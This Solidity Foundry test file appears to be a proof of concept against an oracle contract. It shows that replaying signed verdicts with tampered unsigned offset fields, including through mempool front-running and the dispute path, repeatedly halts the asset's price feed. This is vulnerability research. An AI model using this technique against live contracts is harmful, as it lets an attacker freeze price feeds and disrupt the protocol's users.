// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Vm} from "forge-std/Test.sol";
import {Fixtures} from "./Fixtures.sol";
import {AssayOracle} from "../src/AssayOracle.sol";
import {HaltReason, NavState, RejectReason, Verdict} from "../src/Types.sol";

contract ZZRefutePoc is Fixtures {
    // ---- AXIS 1-4: the hypothesis as literally stated ----
    function test_A_VerbatimReplay_DoesNotHalt() public {
        Verdict[] memory vs = agreeingRound(1_000_000);
        assertTrue(post(vs));
        vm.warp(block.timestamp + 60);

        vm.recordLogs();
        assertFalse(post(vs));
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint8 i = 0; i < 3; ++i) {
            assertEq(uint8(reasonIn(logs, i)), uint8(RejectReason.Stale), "reason should be Stale");
        }
        assertEq(uint8(oracle.navOf(assetId).state), uint8(NavState.Live), "must stay Live");
        assertEq(oracle.haltCount(assetId), 0, "no halt");
        assertEq(oracle.requireFreshNav(assetId), 1_000_000);
    }

    // ---- VARIANT: same calldata, offsets mutated. Offsets are NOT signed. ----
    function test_B_ReplayWithMutatedOffsets_Halts() public {
        Verdict[] memory vs = agreeingRound(1_000_000);
        assertTrue(post(vs));
        assertEq(uint8(oracle.navOf(assetId).state), uint8(NavState.Live));

        vm.warp(block.timestamp + 60);

        // Attacker copies the exact published calldata and flips only the unsigned hint fields.
        Verdict[] memory evil = new Verdict[](3);
        for (uint256 i = 0; i < 3; ++i) {
            evil[i] = Verdict({
                slot: vs[i].slot,
                responseBody: vs[i].responseBody, // untouched -> signature still valid
                signature: vs[i].signature, // untouched
                contentOffset: 0, // bogus hint
                finishOffset: vs[i].finishOffset,
                createdOffset: vs[i].createdOffset
            });
        }

        vm.recordLogs();
        assertFalse(oracle.postAppraisal(assetId, evidence, evil));
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint8 i = 0; i < 3; ++i) {
            assertEq(uint8(reasonIn(logs, i)), uint8(RejectReason.Malformed), "Malformed, not Stale");
        }

        assertEq(uint8(oracle.navOf(assetId).state), uint8(NavState.Halted), "HALTED");
        assertEq(uint8(oracle.lastHaltReason(assetId)), uint8(HaltReason.InsufficientQuorum));
        assertEq(oracle.haltCount(assetId), 1);

        vm.expectRevert();
        oracle.requireFreshNav(assetId);
    }

    // Same, via finishOffset -> Truncated.
    function test_C_MutatedFinishOffset_Halts() public {
        Verdict[] memory vs = agreeingRound(1_000_000);
        assertTrue(post(vs));
        vm.warp(block.timestamp + 60);

        Verdict[] memory evil = new Verdict[](3);
        for (uint256 i = 0; i < 3; ++i) {
            evil[i] = vs[i];
            evil[i].finishOffset = 0;
        }
        assertFalse(oracle.postAppraisal(assetId, evidence, evil));
        assertEq(uint8(oracle.navOf(assetId).state), uint8(NavState.Halted));
        assertEq(uint8(oracle.lastHaltReason(assetId)), uint8(HaltReason.InsufficientQuorum));
    }

    // ---- Is it permanent / repeatable with ONE stored blob? ----
    function test_D_SameStoredBlob_RehaltsForever() public {
        Verdict[] memory vs = agreeingRound(1_000_000);
        assertTrue(post(vs));

        Verdict[] memory evil = new Verdict[](3);
        for (uint256 i = 0; i < 3; ++i) {
            evil[i] = vs[i];
            evil[i].contentOffset = 0;
        }

        uint256 t = START_TIME;
        for (uint256 round = 0; round < 4; ++round) {
            t += 60;
            vm.warp(t);
            // attacker halts with the SAME blob, arbitrarily old
            assertFalse(oracle.postAppraisal(assetId, evidence, evil));
            assertEq(uint8(oracle.navOf(assetId).state), uint8(NavState.Halted), "halted each time");
            vm.expectRevert();
            oracle.requireFreshNav(assetId);

            // operator recovers with a brand new committee round
            t += 60;
            vm.warp(t);
            assertTrue(post(agreeingRound(1_000_000 + round)), "operator republish");
            assertEq(uint8(oracle.navOf(assetId).state), uint8(NavState.Live));
        }
        assertEq(oracle.haltCount(assetId), 4);
    }

    // ---- Does an ancient blob (past maxAgeSec, past watermark) still work? ----
    function test_E_AncientBlob_StillHalts() public {
        Verdict[] memory vs = agreeingRound(1_000_000);
        assertTrue(post(vs));

        Verdict[] memory evil = new Verdict[](3);
        for (uint256 i = 0; i < 3; ++i) {
            evil[i] = vs[i];
            evil[i].contentOffset = 0;
        }

        // way past maxAgeSec (3600) but still inside attestationTtl (7 days)
        vm.warp(block.timestamp + 6 days);
        assertFalse(oracle.postAppraisal(assetId, evidence, evil));
        assertEq(uint8(oracle.navOf(assetId).state), uint8(NavState.Halted), "age is never checked");
    }

    // ---- Does attestation TTL expiry stop it? ----
    function test_F_AfterTtlExpiry_NoHalt() public {
        Verdict[] memory vs = agreeingRound(1_000_000);
        assertTrue(post(vs));

        Verdict[] memory evil = new Verdict[](3);
        for (uint256 i = 0; i < 3; ++i) {
            evil[i] = vs[i];
            evil[i].contentOffset = 0;
        }

        vm.warp(block.timestamp + 8 days);
        vm.recordLogs();
        assertFalse(oracle.postAppraisal(assetId, evidence, evil));
        Vm.Log[] memory logs = vm.getRecordedLogs();
        assertEq(uint8(reasonIn(logs, 0)), uint8(RejectReason.SignerExpired));
        assertEq(uint8(oracle.lastHaltReason(assetId)), uint8(HaltReason.None), "no halt recorded");
    }

    // ---- AXIS 7: the exact Deploy.s.sol config, 5 members / quorum 3 / minDistinct 1 ----
    bytes32 internal constant PROD = keccak256("assay.prod.like");

    function test_H_DeployConfig_HaltsWithThreeCorruptedOffsets() public {
        listCommittee(PROD, 5, 3, 1);
        Verdict[] memory vs = roundFor(PROD, navList(1e6, 1e6, 1e6, 1e6, 1e6));
        assertTrue(oracle.postAppraisal(PROD, evidence, vs));

        vm.warp(block.timestamp + 60);
        // Attacker corrupts only 3 of 5 -> n = 2 < quorum 3, authed = 5 >= quorum 3.
        Verdict[] memory evil = new Verdict[](5);
        for (uint256 i = 0; i < 5; ++i) {
            evil[i] = vs[i];
            if (i < 3) evil[i].contentOffset = 0;
        }
        assertFalse(oracle.postAppraisal(PROD, evidence, evil));
        assertEq(uint8(oracle.navOf(PROD).state), uint8(NavState.Halted));
        assertEq(uint8(oracle.lastHaltReason(PROD)), uint8(HaltReason.InsufficientQuorum));
    }

    // ---- Front-run variant: verdicts are FRESH, so reordering the freshness check would not help.
    function test_I_FrontRunFreshRound_Halts() public {
        // operator assembles a perfectly fresh round; attacker sees it in the mempool
        Verdict[] memory vs = agreeingRound(1_000_000);

        Verdict[] memory evil = new Verdict[](3);
        for (uint256 i = 0; i < 3; ++i) {
            evil[i] = vs[i];
            evil[i].contentOffset = 0;
        }
        // attacker's tx lands first
        assertFalse(oracle.postAppraisal(assetId, evidence, evil));
        assertEq(uint8(oracle.navOf(assetId).state), uint8(NavState.Halted), "halted from Empty");
        assertEq(uint8(oracle.lastHaltReason(assetId)), uint8(HaltReason.InsufficientQuorum));
    }

    // ---- resolveDispute path: same trick? ----
    function test_G_DisputeResolve_WithMutatedOffsets() public {
        Verdict[] memory vs = agreeingRound(1_000_000);
        assertTrue(post(vs));

        address atk = makeAddr("atk");
        vm.deal(atk, 1 ether);
        vm.prank(atk);
        oracle.challenge{value: 0.01 ether}(assetId);

        Verdict[] memory evil = new Verdict[](3);
        for (uint256 i = 0; i < 3; ++i) {
            evil[i] = vs[i];
            evil[i].contentOffset = 0;
        }
        // authed=3 >= quorum -> not Unauthenticated; n=0 -> InsufficientQuorum -> InconclusiveRound
        vm.expectRevert(abi.encodeWithSelector(AssayOracle.InconclusiveRound.selector, HaltReason.InsufficientQuorum));
        oracle.resolveDispute(assetId, evidence, evil);
    }
}
